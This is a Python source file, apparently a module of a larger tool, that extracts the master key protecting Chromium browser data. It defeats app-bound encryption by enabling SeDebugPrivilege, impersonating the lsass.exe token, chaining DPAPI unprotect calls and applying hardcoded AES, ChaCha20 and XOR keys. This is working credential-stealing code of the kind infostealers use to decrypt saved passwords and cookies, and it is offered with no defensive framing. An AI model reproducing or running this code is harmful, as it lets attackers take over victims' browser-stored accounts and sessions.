import io
import json
import struct
import ctypes
import windows
import binascii
import windows.crypto
import windows.generated_def as gdef
from contextlib import contextmanager
from Crypto.Cipher import AES, ChaCha20_Poly1305
from modules.runasadmin.run_as_admin import run_as_admin, is_admin

class GetMasterKey:
    def __init__(self, local_state_path: str, key_name: str):
        self.local_state_path = local_state_path
        self.key_name = key_name
        
    @contextmanager
    def impersonate_lsass(self):
        original_token = windows.current_thread.token
        try:
            windows.current_process.token.enable_privilege("SeDebugPrivilege")
            proc = next(p for p in windows.system.processes if p.name == "lsass.exe")
            lsass_token = proc.token
            impersonation_token = lsass_token.duplicate(
                type=gdef.TokenImpersonation,
                impersonation_level=gdef.SecurityImpersonation
            )
            windows.current_thread.token = impersonation_token
            yield
        except Exception:
            pass
        finally:
            windows.current_thread.token = original_token
    
    def parse_key_blob(self, blob_data: bytes) -> dict | None:
        try:
            buffer = io.BytesIO(blob_data)
            parsed_data = {}
            header_len = struct.unpack('<I', buffer.read(4))[0]
            parsed_data['header'] = buffer.read(header_len)
            content_len = struct.unpack('<I', buffer.read(4))[0]
            if header_len + content_len + 8 != len(blob_data):
                print("part 1")
                return None
            parsed_data['flag'] = buffer.read(1)[0]
            if parsed_data['flag'] in (1, 2):
                parsed_data['iv'] = buffer.read(12)
                parsed_data['ciphertext'] = buffer.read(32)
                parsed_data['tag'] = buffer.read(16)
            elif parsed_data['flag'] == 3:
                parsed_data['encrypted_aes_key'] = buffer.read(32)
                parsed_data['iv'] = buffer.read(12)
                parsed_data['ciphertext'] = buffer.read(32)
                parsed_data['tag'] = buffer.read(16)
            else:
                parsed_data['raw_data'] = buffer.read()
            return parsed_data
        except Exception as e:
            return None
    
    def decrypt_with_cng(self, input_data: bytes, key_name: str) -> bytes | None:
        try:
            ncrypt = ctypes.windll.NCRYPT
            hProvider = gdef.NCRYPT_PROV_HANDLE()
            provider_name = "Microsoft Software Key Storage Provider"
            status = ncrypt.NCryptOpenStorageProvider(ctypes.byref(hProvider), provider_name, 0)
            if status != 0:
                print(f"NCryptOpenStorageProvider failed with status {status}")
                return None
                
            hKey = gdef.NCRYPT_KEY_HANDLE()
            status = ncrypt.NCryptOpenKey(hProvider, ctypes.byref(hKey), key_name, 0, 0)
            
            if status != 0:
                print(f"NCryptOpenKey failed with status {status}")
                return None
                
            pcbResult = gdef.DWORD(0)
            input_buffer = (ctypes.c_ubyte * len(input_data)).from_buffer_copy(input_data)
            status = ncrypt.NCryptDecrypt(hKey, input_buffer, len(input_buffer), None, None, 0, ctypes.byref(pcbResult), 0x40)

            if status != 0:
                print(f"1st NCryptDecrypt failed with status {status}")
                return None
                
            buffer_size = pcbResult.value
            output_buffer = (ctypes.c_ubyte * pcbResult.value)()
            status = ncrypt.NCryptDecrypt(hKey, input_buffer, len(input_buffer), None, output_buffer, buffer_size,
                                        ctypes.byref(pcbResult), 0x40)
            if status != 0:
                print(f"2nd NCryptDecrypt failed with status {status}")
                return None
                
            ncrypt.NCryptFreeObject(hKey)
            ncrypt.NCryptFreeObject(hProvider)
            return bytes(output_buffer[:pcbResult.value])
        except Exception as err:
            return None
    
    def byte_xor(self, ba1, ba2):
        return bytes([_a ^ _b for _a, _b in zip(ba1, ba2)])
    
    def derive_v20_master_key(self, parsed_data: dict, key_name) -> bytes:
        try:
            if parsed_data['flag'] == 1:
                aes_key = bytes.fromhex("B31C6E241AC846728DA9C1FAC4936651CFFB944D143AB816276BCC6DA0284787")
                cipher = AES.new(aes_key, AES.MODE_GCM, nonce=parsed_data['iv'])
                return cipher.decrypt_and_verify(parsed_data['ciphertext'], parsed_data['tag'])
                
            elif parsed_data['flag'] == 2:
                chacha20_key = bytes.fromhex("E98F37D7F4E1FA433D19304DC2258042090E2D1D7EEA7670D41F738D08729660")
                cipher = ChaCha20_Poly1305.new(key=chacha20_key, nonce=parsed_data['iv'])
                return cipher.decrypt_and_verify(parsed_data['ciphertext'], parsed_data['tag'])
                
            elif parsed_data['flag'] == 3:
                xor_key = bytes.fromhex("CCF8A1CEC56605B8517552BA1A2D061C03A29E90274FB2FCF59BA4B75C392390")
                with self.impersonate_lsass():
                    decrypted_aes_key = self.decrypt_with_cng(parsed_data['encrypted_aes_key'], key_name)
                xored_aes_key = self.byte_xor(decrypted_aes_key, xor_key)
                cipher = AES.new(xored_aes_key, AES.MODE_GCM, nonce=parsed_data['iv'])
                return cipher.decrypt_and_verify(parsed_data['ciphertext'], parsed_data['tag'])
            else:
                return parsed_data.get('raw_data', b'')
        except Exception as err:
            print(err)
    
    def get_master_key(self):
        with open(self.local_state_path, "r", encoding="utf-8") as f:
            json_data = json.load(f)
        
        if "os_crypt" in json_data and "app_bound_encrypted_key" in json_data["os_crypt"]:
            if not is_admin():
                return None
            key_blob_encrypted = binascii.a2b_base64(json_data["os_crypt"]["app_bound_encrypted_key"])[4:]
        elif "os_crypt" in json_data and "encrypted_key" in json_data["os_crypt"]:
            key_blob_encrypted = binascii.a2b_base64(json_data["os_crypt"]["encrypted_key"])[5:]
            try:
                return windows.crypto.dpapi.unprotect(key_blob_encrypted)
            except Exception as error:
                print(f"error  in the dpapi user pravelige -20v {error} line 123")
                return None
        else:
            return None
            
        with self.impersonate_lsass():
            try:
                key_blob_system_decrypted = windows.crypto.dpapi.unprotect(key_blob_encrypted)
            except Exception as err:
                print("error in dpapi systeam privelige {}".format(err))
                return None
                
        key_blob_user_decrypted = windows.crypto.dpapi.unprotect(key_blob_system_decrypted)
        parsed_data = self.parse_key_blob(key_blob_user_decrypted)
        
        if parsed_data is None:
            return None

            
        if parsed_data['flag'] not in (1, 2, 3):
            return key_blob_user_decrypted[-32:]
        
        masterKey = self.derive_v20_master_key(parsed_data, self.key_name)
        
        if not masterKey or len(masterKey) != 32:
            return None
        
        return masterKey

if __name__ == "__main__":
    import os
    LOCALAPPDATA = os.getenv("LOCALAPPDATA")
    done = GetMasterKey(r"C:\Users\yoi\AppData\Local\Chromium\User Data\Local State", "Google Chromekey1")
    data = done.get_master_key()
    print(data)